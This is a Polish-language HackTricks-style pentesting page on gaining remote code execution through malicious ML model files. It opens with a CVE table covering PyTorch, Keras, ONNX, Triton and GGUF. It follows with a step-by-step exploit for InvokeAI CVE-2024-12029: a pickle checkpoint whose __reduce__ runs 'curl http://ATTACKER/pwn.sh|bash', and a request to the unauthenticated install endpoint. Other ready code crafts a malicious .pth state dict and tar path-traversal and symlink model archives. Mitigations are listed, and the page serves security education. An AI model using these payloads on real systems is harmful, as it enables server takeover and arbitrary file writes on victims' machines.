# Modele RCE

{{#include ../banners/hacktricks-training.md}}

## Ładowanie modeli do RCE

Modele uczenia maszynowego są zazwyczaj udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch itp. Modele te mogą być ładowane na maszyny deweloperów lub systemy produkcyjne w celu ich wykorzystania. Zazwyczaj modele nie powinny zawierać złośliwego kodu, ale są przypadki, w których model może być użyty do wykonania dowolnego kodu w systemie jako zamierzona funkcja lub z powodu luki w bibliotece ładującej model.

W momencie pisania, oto kilka przykładów tego typu luk:

| **Framework / Narzędzie**   | **Luka (CVE, jeśli dostępne)**                                                                                               | **Wektor RCE**                                                                                                                        | **Odnośniki**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Niebezpieczna deserializacja w* `torch.load` **(CVE-2025-32434)**                                                          | Złośliwy pickle w punkcie kontrolnym modelu prowadzi do wykonania kodu (obejście zabezpieczenia `weights_only`)                       | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + złośliwe pobieranie modelu powoduje wykonanie kodu; deserializacja RCE w API zarządzania                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (niebezpieczny YAML) <br> **CVE-2024-3660** (Keras Lambda)                                               | Ładowanie modelu z YAML używa `yaml.unsafe_load` (wykonanie kodu) <br> Ładowanie modelu z warstwą **Lambda** uruchamia dowolny kod Pythona | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsing TFLite)                                                                                          | Opracowany model `.tflite` wywołuje przepełnienie całkowite → uszkodzenie sterty (potencjalne RCE)                                   | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Ładowanie modelu za pomocą `joblib.load` wykonuje pickle z ładunkiem `__reduce__` atakującego                                        | |
| **NumPy** (Python)          | **CVE-2019-6446** (niebezpieczne `np.load`) *kwestionowane*                                                                  | Domyślnie `numpy.load` pozwalało na ładowanie zserializowanych tablic obiektów – złośliwe `.npy/.npz` wywołuje wykonanie kodu        | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (przechodzenie katalogów) <br> **CVE-2024-5187** (przechodzenie tar)                                      | Ścieżka zewnętrznych wag modelu ONNX może uciec z katalogu (odczyt dowolnych plików) <br> Złośliwy model ONNX tar może nadpisać dowolne pliki (prowadząc do RCE) | |
| ONNX Runtime (ryzyko projektowe) | *(Brak CVE)* niestandardowe operacje ONNX / przepływ sterowania                                                            | Model z niestandardowym operatorem wymaga załadowania natywnego kodu atakującego; złożone grafy modelu nadużywają logiki do wykonania niezamierzonych obliczeń | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (przechodzenie ścieżek)                                                                                   | Użycie API ładowania modelu z włączonym `--model-control` pozwala na przechodzenie ścieżek względnych do zapisywania plików (np. nadpisanie `.bashrc` dla RCE) | |
| **GGML (format GGUF)**      | **CVE-2024-25664 … 25668** (wiele przepełnień sterty)                                                                        | Źle sformatowany plik modelu GGUF powoduje przepełnienia bufora sterty w parserze, umożliwiając wykonanie dowolnego kodu na systemie ofiary | |
| **Keras (starsze formaty)** | *(Brak nowego CVE)* Legacy model Keras H5                                                                                     | Złośliwy model HDF5 (`.h5`) z kodem warstwy Lambda nadal wykonuje się podczas ładowania (tryb bezpieczeństwa Keras nie obejmuje starego formatu – „atak degradacyjny”) | |
| **Inne** (ogólnie)          | *Wada projektowa* – serializacja Pickle                                                                                      | Wiele narzędzi ML (np. formaty modeli oparte na pickle, Python `pickle.load`) wykona dowolny kod osadzony w plikach modeli, chyba że zostanie to złagodzone | |

Ponadto istnieją modele oparte na python pickle, takie jak te używane przez [PyTorch](https://github.com/pytorch/pytorch/security), które mogą być użyte do wykonania dowolnego kodu w systemie, jeśli nie są ładowane z `weights_only=True`. Tak więc, każdy model oparty na pickle może być szczególnie podatny na tego typu ataki, nawet jeśli nie są wymienione w powyższej tabeli.

### 🆕  InvokeAI RCE przez `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny interfejs webowy open-source dla Stable-Diffusion. Wersje **5.3.1 – 5.4.2** udostępniają punkt końcowy REST `/api/v2/models/install`, który pozwala użytkownikom pobierać i ładować modele z dowolnych adresów URL.

Wewnątrz punkt końcowy ostatecznie wywołuje:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Kiedy dostarczony plik to **PyTorch checkpoint (`*.ckpt`)**, `torch.load` wykonuje **deserializację pickle**. Ponieważ zawartość pochodzi bezpośrednio z kontrolowanego przez użytkownika URL, atakujący może osadzić złośliwy obiekt z niestandardową metodą `__reduce__` wewnątrz checkpointu; metoda ta jest wykonywana **podczas deserializacji**, co prowadzi do **zdalnego wykonania kodu (RCE)** na serwerze InvokeAI.

Luka została przypisana **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Przewodnik po eksploatacji

1. Stwórz złośliwy checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` na serwerze HTTP, który kontrolujesz (np. `http://ATTACKER/payload.ckpt`).
3. Wywołaj podatny punkt końcowy (brak wymagań dotyczących uwierzytelnienia):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Kiedy InvokeAI pobiera plik, wywołuje `torch.load()` → uruchamia się gadżet `os.system`, a atakujący uzyskuje wykonanie kodu w kontekście procesu InvokeAI.

Gotowy exploit: **Metasploit** moduł `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje cały proces.

#### Warunki

•  InvokeAI 5.3.1-5.4.2 (domyślna flaga skanowania **false**)
•  `/api/v2/models/install` dostępne dla atakującego
•  Proces ma uprawnienia do wykonywania poleceń powłoki

#### Łagodzenia

* Uaktualnij do **InvokeAI ≥ 5.4.3** – łatka ustawia `scan=True` domyślnie i przeprowadza skanowanie złośliwego oprogramowania przed deserializacją.
* Podczas programowego ładowania punktów kontrolnych używaj `torch.load(file, weights_only=True)` lub nowego [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) pomocnika.
* Wymuszaj listy dozwolone / podpisy dla źródeł modeli i uruchamiaj usługę z minimalnymi uprawnieniami.

> ⚠️ Pamiętaj, że **jakikolwiek** format oparty na Python pickle (w tym wiele plików `.pt`, `.pkl`, `.ckpt`, `.pth`) jest z natury niebezpieczny do deserializacji z niezaufanych źródeł.

---

Przykład ad-hoc łagodzenia, jeśli musisz utrzymać starsze wersje InvokeAI działające za odwrotnym proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Przykład – tworzenie złośliwego modelu PyTorch

- Stwórz model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Załaduj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modele do przejścia ścieżki

Jak wspomniano w [**tym wpisie na blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), większość formatów modeli używanych przez różne frameworki AI opiera się na archiwach, zazwyczaj `.zip`. Dlatego może być możliwe nadużycie tych formatów do przeprowadzania ataków typu path traversal, co pozwala na odczyt dowolnych plików z systemu, w którym model jest załadowany.

Na przykład, za pomocą poniższego kodu możesz stworzyć model, który utworzy plik w katalogu `/tmp` po załadowaniu:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Lub, za pomocą poniższego kodu możesz stworzyć model, który utworzy symlink do katalogu `/tmp`, gdy zostanie załadowany:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Odniesienia

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
